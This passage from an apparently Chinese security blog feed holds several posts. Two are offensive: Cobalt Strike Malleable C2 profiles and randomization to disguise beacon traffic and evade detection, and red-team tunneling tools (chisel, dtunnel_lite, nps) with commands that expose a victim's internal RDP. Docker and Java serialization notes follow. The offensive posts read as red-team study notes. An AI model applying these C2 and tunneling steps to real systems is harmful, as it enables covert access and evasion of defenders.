rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：</a></p><ul><li>启动CS的teamserver时同时加载Malleable-C2-Profiles命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure><ul><li>检查预览Profiles文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [/path/to/my.profile]</span><br></pre></td></tr></table></figure><h2 id="0x01-使用实例"><a href="#0x01-使用实例" class="headerlink" title="0x01 使用实例"></a>0x01 使用实例</h2><p>因为是在公司的资产上进行攻击的，这里就不放上截图了。稍微记录一下手法就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：10.100.19.19</span><br><span class="line">CS客户端：10.100.19.19</span><br><span class="line">受害机：20.100.0.25</span><br></pre></td></tr></table></figure><p>首先启动CS服务器，这里假设使用的混淆profile名为amazon.profile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：</span><br><span class="line">./teamserver 10.100.19.19 123456 /opt/malleable_C2_profile/amazon.profile</span><br></pre></td></tr></table></figure><p>然后我们在同一部主机另开终端连接CS服务，成为CS客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS客户端</span><br><span class="line">./start.sh 10.100.19.19 123456</span><br></pre></td></tr></table></figure><p>然后CS就会执行进入图形化界面。直接使用默认的端口和用户名密码点击connect进入CS页面。我们要给受害机开启一个监听端口，点击“CobaltStrike -&gt; listeners”，然后选择参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name：didi</span><br><span class="line">Paylaod：Beacon Http</span><br><span class="line">HTTP Hosts：10.10.19.19</span><br><span class="line">HTTP Hosts（Stager）：10.10.19.19</span><br><span class="line">Profile:defualt</span><br><span class="line">HTTP Port(C2):80</span><br></pre></td></tr></table></figure><p>这样就就在CS服务器上开启了80端口监听受害机流量啦，并且通过http形式进行传输。我们现在要生成控制客户端的恶意软件，这里有很多种形式。下面是参考链接：<a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a> </p><p>这里我继续我自己的做法，我想生成一个受害机上运行的恶意文件。点击“Attack -&gt; Packeges -&gt; Windows Executables”，然后选择刚刚添加的监听并点击Generate进行构建。然后我们将输出的exe上传到受害主机上，只要受害机一点击，马上就能在CS上上线。</p><p>然后因为我们选择了profile，所以抓包观察的话能看到，通信请求都被伪造成对amazon的请求，能在一定程度上达成混淆视听的作用。</p><h2 id="0x02-随机profile"><a href="#0x02-随机profile" class="headerlink" title="0x02 随机profile"></a>0x02 随机profile</h2><p>因为这个profile库已经发布很久了，我个人感觉肯定很多对其进行样本添加了，那我们应该对其进行随机化进行绕检测。</p><p>工具链接：<a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上打了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上打了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：</a></p><ul><li>模板的具体样本的生成<ul><li>我们可以使用它给我们的模板（/sample template），然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 2 -cobalt /opt/cobaltstrike4.0 -output shabi”直接生成它预设的模板的2个样本。</li><li>我们也可以自己在想改的地方改成“%%wordlist%%”，然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 1 -cobalt /opt/cobaltstrike4.0 -wordlist /opt/hostname.txt -output shabi”（/opt/hostname.txt里面就是自己写好的想要替换进去模板种的%%wordlist%%的具体内容）生成我们需要的模板的1个样本。</li></ul></li><li>然后根据上一章节一样的启动方法，把指定profile路径的那个位置修改为刚刚Randomize生成新的profile的路径，然后启动即可。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>CS是今天第一次接触，就这个隐藏通信流量就已经感觉到了他的强大之处，继续努力变得更强。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Malleable-C2-Profile&quot;&gt;&lt;a href=&quot;#Malleable-C2-Profile&quot; class=&quot;headerlink&quot; title=&quot;Malleable_C2_Profile&quot;&gt;&lt;/a&gt;Malleable_C2_Profile&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>红队代理工具</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/%E7%BA%A2%E9%98%9F%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/%E7%BA%A2%E9%98%9F%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/</id>
    <published>2020-04-16T08:45:00.000Z</published>
    <updated>2020-06-16T13:28:10.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队代理工具"><a href="#红队代理工具" class="headerlink" title="红队代理工具"></a>红队代理工具</h1><p>好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，一是为了总结用法，而是为了记录工作的进展。</p><h2 id="0x00-frp"><a href="#0x00-frp" class="headerlink" title="0x00 frp"></a>0x00 frp</h2><p>frp需要三台主机，一台内网受害机，一台外网服务机，一台外网攻击访问机。</p><ul><li>服务端配置frps.ini监听端口，然后./frps -c ./frps.ini开启监听。</li><li>客户端配置frpc.ini服务端地址和端口和使用的协议，然后./frpc -c ./frpc.ini开启。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li><li><input checked disabled type="checkbox"> stcp</li></ul><blockquote><p>开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上</p></blockquote><ul><li><input checked disabled type="checkbox"> xtcp</li></ul><blockquote><p>首先根据wiki在服务端的./frps.ini添加udp的监听端口。然后开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上</p></blockquote><h2 id="0x01-fcn"><a href="#0x01-fcn" class="headerlink" title="0x01 fcn"></a>0x01 fcn</h2><p>fcn需要两台主机，一台内网受害机，一台外网攻击机（其客户端和服务端与其他相反）。</p><ul><li>在内网主机上开启fcn后点击服务端，配置好密码并开启服务。</li><li>在外网攻击机上开启fcn后点击客户端，配置好名称和ID密码等后等待连接成功。</li><li>连接成功后外网主机就能直接mstsc连接到内网主机上。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> <p>tcp</p></li><li><input checked disabled type="checkbox"> <p>udp</p></li><li><input disabled type="checkbox"> <p>tls</p></li></ul><h2 id="0x02-ngrok"><a href="#0x02-ngrok" class="headerlink" title="0x02 ngrok"></a>0x02 ngrok</h2><p>ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，然后记录自己的token，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机的cmd上按格式使用命令ngrok tcp 3389就能把本地远程桌面映射到ngrok提供的域名的端口上。</li><li>在攻击机上mstsc到ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li></ul><h2 id="0x03-sunny-ngrok"><a href="#0x03-sunny-ngrok" class="headerlink" title="0x03 sunny-ngrok"></a>0x03 sunny-ngrok</h2><p>sunny-ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，并开通隧道获取隧道ID，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上使用客户端按官网wiki的格式执行命令。其中隧道ID用于启动隧道，就能把本地远程桌面映射到sunny-ngrok提供的域名端口上。</li><li>在攻击机上mstsc到sunny-ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li></ul><h2 id="0x04-natapp"><a href="#0x04-natapp" class="headerlink" title="0x04 natapp"></a>0x04 natapp</h2><p>natapp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在natapp官网申请个人账号，并获取authtoken，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上运行客户端，通过指定authtoken启动隧道，就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><h2 id="0x05-小米球"><a href="#0x05-小米球" class="headerlink" title="0x05 小米球"></a>0x05 小米球</h2><p>小米球需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在小米球官网申请个人账号，下载客户端。</li><li>将客户端上传到受害机上，在yml配置文件里面写好映射的本地端口和隧道名，使用cmd按官网教程格式运行命令，小米球就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><h2 id="0x06-nps"><a href="#0x06-nps" class="headerlink" title="0x06 nps"></a>0x06 nps</h2><p>nps的tcp和udp需要三台主机，一台内网受害机，一台外网攻击机，一台外网服务器。</p><ul><li>在外网服务器上开启nps服务，然后进入web页面进行客户端添加和tcp隧道的建立。</li><li>在内网服务器上开启nps服务，连接到外网服务器。</li><li>在外网攻击机上mstsc外网服务器的端口就能连接到内网的3389。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><p><strong>sock代理做法</strong></p><p>nps的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启nps，然后在web页面开启自己的代理监听端口。</li><li>在受害机上开启npc，然后连接到外网服务器上。</li><li>在攻击机上用proxifier将外网服务器的监听端口添加到代理服务器中，然后找到mstsc<strong>右键</strong>，使用proxifier运行，然后连输入内网主机ip即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> sock</li></ul><p>其他基本做法都大同小异，可以看下面的参考</p><p> <a href="https://maizer.pw/index.php/archives/37/" target="_blank" rel="noopener">https://maizer.pw/index.php/archives/37/</a> </p><p> <a href="https://maizer.pw/index.php/archives/50/" target="_blank" rel="noopener">https://maizer.pw/index.php/archives/50/</a> </p><p> <a href="https://www.moerats.com/archives/891/" target="_blank" rel="noopener">https://www.moerats.com/archives/891/</a> </p><h2 id="0x07-花生壳"><a href="#0x07-花生壳" class="headerlink" title="0x07 花生壳"></a>0x07 花生壳</h2><p>同上面ngrok系列的做法，因为做了很久就不记录了。</p><h2 id="0x08-狗洞"><a href="#0x08-狗洞" class="headerlink" title="0x08 狗洞"></a>0x08 狗洞</h2><p>狗洞的tcp和udp需要三台主机，一台内网受害机，一台外网攻击机，一台外网服务器。</p><ul><li>在外网服务机上开启狗洞服务，./dtunnel_lite -service 10.100.19.19:1234 -v -xor 12345 (默认udp，<strong>-tcp</strong>指定使用tcp)</li><li>在内网受害机上开启狗洞服务，这里注意需要 <strong>-r 指定反向模式才能反向端口映射</strong>使得内网的3389映射到外网服务器上，dtunnel_lite -service 10.100.19.19:1234 -v -action 127.0.0.1:3389 -encrypt -xor 12345 -local:6666 -r(默认udp，-tcp指定使用tcp)</li><li>在外网攻击机上mstsc外网服务器的6666端口就能连接到内网的3389。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input checked disabled type="checkbox"> udp</li></ul><p><strong>反向sock5代理做法</strong></p><p>狗洞的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启狗洞服务，./dtunnel_lite -service 10.100.19.19:1234 -v -xor 12345</li><li>在受害机上开启狗洞服务，这里注意需要 <strong>-r 指定反向模式才能反向代理</strong>使得设置内网机器的反向代理机器为外网服务器，dtunnel_lite -service 10.100.19.19:1234 -v -action  socks5 -encrypt -xor 12345 -local:8787 -r</li><li>在攻击机上用proxifier将外网服务器的10.100.19.19和反向监听端口8787添加到代理服务器中，然后找到mstsc<strong>右键使用proxifier运行</strong>，然后连输入内网主机ip即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> sock5</li></ul><h2 id="0x09-Chisel"><a href="#0x09-Chisel" class="headerlink" title="0x09 Chisel"></a>0x09 Chisel</h2><p>官方文档就是一坨屎，这两个个链接不错： </p><p><a href="https://www.puckiestyle.nl/pivot-with-chisel/" target="_blank" rel="noopener">https://www.puckiestyle.nl/pivot-with-chisel/</a> </p><p><a href="https://www.cnblogs.com/heycomputer/articles/10697828.html" target="_blank" rel="noopener">https://www.cnblogs.com/heycomputer/articles/10697828.html</a> </p><p>chisel的tcp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在外网攻击机上开启监听端口，chisel server -p 1111 -reverse。</li><li>在内网受害机上将本地端口反向映射到外网攻击机上，chisel client 10.100.19.30:1111 R:2222：127.0.0.1:3389。</li><li>在外网攻击机上自己日自己的2222端口即可访问到内网受害机，mstsc 127.0.0.1:2222。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li></ul><p><strong>sock5代理做法</strong></p><p>chisel的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启chisel服务，chisel server -p 1111 -reverse，开启<strong>建立连接</strong>的监听端口。</li><li>在内网受害机上连接并开启<strong>反向sock5</strong>服务，chisel client 10.100.19.30:1111 5555:socks，让服务器的5555端口开启sock5，<strong>反向代理</strong>访问内网受害机的流量。</li><li>在外网攻击机上连接20.100.0.25，内网响应后传给反向代理服务器即外网服务器，然后外网服务器和外网攻击机都在外能能通信，所以就能成功连接。</li></ul><p>未成功，应该是反向代理没设置好。</p><ul><li><input disabled type="checkbox"> sock</li></ul><h2 id="0x10-小结"><a href="#0x10-小结" class="headerlink" title="0x10 小结"></a>0x10 小结</h2><p>工具用法何其多，这些并不是重要的。最重要的是，我们要知道里面的原理，然后通过工具去积累思路，尝试自己去写出这样的工具，才是真正的学习呐~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队代理工具&quot;&gt;&lt;a href=&quot;#红队代理工具&quot; class=&quot;headerlink&quot; title=&quot;红队代理工具&quot;&gt;&lt;/a&gt;红队代理工具&lt;/h1&gt;&lt;p&gt;好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，一是为了总结用法，而是
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://bai-ren-1.github.io/2020/04/05/Docker/"/>
    <id>http://bai-ren-1.github.io/2020/04/05/Docker/</id>
    <published>2020-04-05T05:01:14.000Z</published>
    <updated>2020-04-05T05:43:31.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写一篇简单的博客，记录一下工作技术栈之一的Docker简单用法。</p><h2 id="0x00-容器使用"><a href="#0x00-容器使用" class="headerlink" title="0x00 容器使用"></a>0x00 容器使用</h2><p>这里我把命令都集合在一起，看起来比较方便。下面都是有关容器的一些用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull &lt;镜像名称&gt;  # 获取镜像</span><br><span class="line">$ docker run &lt;镜像名称&gt;       # 启动容器</span><br><span class="line">$ docker ps -a    # 查看所有容器列表</span><br><span class="line">$ docker start &lt;容器 ID&gt;  # 启动已停止的容器</span><br><span class="line">$ docker stop &lt;容器 ID&gt; # 停止容器</span><br><span class="line">$ docker restart &lt;容器 ID&gt; # 重启容器（启动容器是第一次，用的是run且参数是镜像）</span><br><span class="line">$ docker attach &lt;容器 ID&gt; # 进入容器（-d 参数时，容器启动后会进入后台，用attach可进入容器）</span><br><span class="line">$ docker export &lt;容器 ID&gt; &gt; &lt;文件名&gt; # 导出容器</span><br><span class="line">$ docker rm -f &lt;容器 ID&gt;      # 删除容器</span><br></pre></td></tr></table></figure><h2 id="0x01-镜像使用"><a href="#0x01-镜像使用" class="headerlink" title="0x01 镜像使用"></a>0x01 镜像使用</h2><p>OK，看完了容器，我们就来学习用法开启容器的镜像的用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker images  # 列出本地镜像列表</span><br><span class="line">$ docker pull &lt;镜像名称&gt;:&lt;版本号&gt;# 拉取镜像到本地</span><br><span class="line">$ docker search &lt;搜索关键字&gt;  # 查找仓库的镜像</span><br><span class="line">$ docker rmi &lt;镜像名称&gt;# 删除本地镜像</span><br><span class="line">$ docker build# 创建新的镜像</span><br></pre></td></tr></table></figure><h2 id="0x02-仓库管理"><a href="#0x02-仓库管理" class="headerlink" title="0x02 仓库管理"></a>0x02 仓库管理</h2><p>我们要拉取镜像到本地，都是到仓库上面找的，仓库是集中存放镜像的地方。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ docker login# 登录仓库</span><br><span class="line">$ docker logout# 注销仓库</span><br><span class="line">$ docker push &lt;用户名&gt;/&lt;镜像名称&gt;:&lt;版本号&gt;# 推送镜像</span><br></pre></td></tr></table></figure><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>当然还有制作Dockerfile的内容，但是太多辣，这里先不写着了。等工作用到的时候再记录进来，祝一切顺利吧！</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Docker&quot;&gt;&lt;a href=&quot;#Docker&quot; class=&quot;headerlink&quot; title=&quot;Docker&quot;&gt;&lt;/a&gt;Docker&lt;/h1&gt;&lt;p&gt;哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写
      
    
    </summary>
    
    
      <category term="计算机基础" scheme="http://bai-ren-1.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
  </entry>
  
  <entry>
    <title>Java反序列化</title>
    <link href="http://bai-ren-1.github.io/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://bai-ren-1.github.io/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-04-01T06:12:03.000Z</published>
    <updated>2020-04-02T03:20:58.945Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化"><a href="#Java反序列化" class="headerlink" title="Java反序列化"></a>Java反序列化</h1><p>没啥好说的，比赛打太多的憨批只会PHP，实际工作都是Java，鬼特么现在还有人用PHP就奇了。所以这里记录一下Java反序列化的机制，下一节博客再说Java反序列化漏洞。</p><h2 id="0x00-概念"><a href="#0x00-概念" class="headerlink" title="0x00 概念"></a>0x00 概念</h2><p>序列化和反序列化的实现方法概念？</p><ul><li>Java 序列化是指把 Java 对象转换为字节序列的过程。ObjectOutputStream类的 <strong>writeObject()方法</strong>可以实现序列化。</li><li>Java 反序列化是指把字节序列恢复为 Java 对象的过程。ObjectInputStream 类的 <strong>readObject()方法</strong>用于反序列化。</li></ul><blockquote><p>那么序列化的目的是什么呢？序列化与反序列化是让 Java 对象脱离 Java 运行环境的一种手段，可以有效的实现多平台之间的通信、对象持久化存储。 </p></blockquote><h2 id="0x01-实现方法"><a href="#0x01-实现方法" class="headerlink" title="0x01 实现方法"></a>0x01 实现方法</h2><p>Java中的一个类的对象要想序列化成功，必须满足两个条件：</p><ul><li>该类必须实现 <strong>java.io.Serializable 接口</strong>，因为 Serializable 接口是启用其序列化功能的接口。</li><li>该类的所有属性必须是可序列化的。</li></ul><blockquote><p>关于<strong>接口和抽象方法</strong>等的相关知识请自行查阅相关课程。</p></blockquote><p>我们做一个简单的实验，用来验证序列化和反序列化的过程：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.shabi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">//实现Serializable接口的Student类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Student</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getSex</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setSex</span><span class="params">(String sex)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//实现serialize接口的三个抽象方法，这里只是简单打印消息进行验证</span></span><br><span class="line">    <span class="comment">//不实现，也是能直接调用ObjectInputStream.readObject进行反序列化</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream s)</span> <span class="keyword">throws</span> ClassNotFoundException, IOException </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student readObject"</span>);</span><br><span class="line">         s.defaultReadObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//不实现，也是能直接调用ObjectOutputStream.writeObject进行序列化的    </span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream s)</span><span class="keyword">throws</span> java.io.IOException</span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student writeObject"</span>);</span><br><span class="line">          s.defaultWriteObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> Object <span class="title">readResolve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">          System.out.println(<span class="string">"Student readResolve"</span>);</span><br><span class="line">         <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span> <span class="keyword">throws</span> FileNotFoundException, IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    Student student = <span class="keyword">new</span> Student();</span><br><span class="line">    student.setName(<span class="string">"chenxiaoyi"</span>);</span><br><span class="line">    student.setSex(<span class="string">"man"</span>);</span><br><span class="line"><span class="keyword">try</span> (ObjectOutputStream output = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="keyword">new</span> File(<span class="string">"Student.txt"</span>)))) &#123;</span><br><span class="line">output.writeObject(student);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">try</span> (ObjectInputStream input = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(<span class="string">"Student.txt"</span>)))) &#123;</span><br><span class="line">Student student1 = (Student) input.readObject();</span><br><span class="line">System.out.println(student1.getName() + <span class="string">":"</span> + student1.getSex());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>如果目标类中没有定义私有的writeObject或readObject方法，那么序列化和反序列化的时候将调用默认的方法来根据目标类中的属性（不包含transient修饰的属性以及static变量）来进行序列化和反序列化。</p><p>如果目标类中定义了私有的writeObject或readObject方法，那么序列化和反序列化的时候将通过反射调用目标类指定的writeObject或readObject方法来实现，比如将static变量也加入到序列化中。</p><p>至于readResolve同样也是通过<strong>反射</strong>调用的。从内存中反序列化地”组装”一个新对象时，就会自动调用这个 readResolve方法来返回指定好的对象。从上面结果可以看到它是在readObject之后调用的，因此readResolve可以最终修改反序列化得到的对象。</p></blockquote><p>关于相关的序列化和反序列化的过程的学习，要具体看下面实验：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/2.png" alt>在开始实验之前，我们可以看到项目的根目录下没有序列化文件的存在。OK，我们可以开始实验了。</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/1.png" alt></p><p>我们开始进行debug，看看这个具体过程。下断点，然后慢慢运行到对象输出流的<strong>writeObject方法</strong>即序列化处：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/3.png" alt></p><p>当运行到此时，我们可以看到已经生成了一个student对象和一个对象输出流output，我们看根目录下生成的Student.txt对象流文件：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/4.png" alt></p><blockquote><p>ObjectOutputStream建立后第一次写入一个对象时，会在对象数据前写入一些标志的数据“ACED0005” </p></blockquote><p>我们继续step over，看看执行完writeObject后的结果：</p><p><img src="/2020/04/01/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/5.png" alt></p><p>winhex中打开的Student.txt相应的变化了，文件中写入了我们需要的序列化内容：</p><p><img 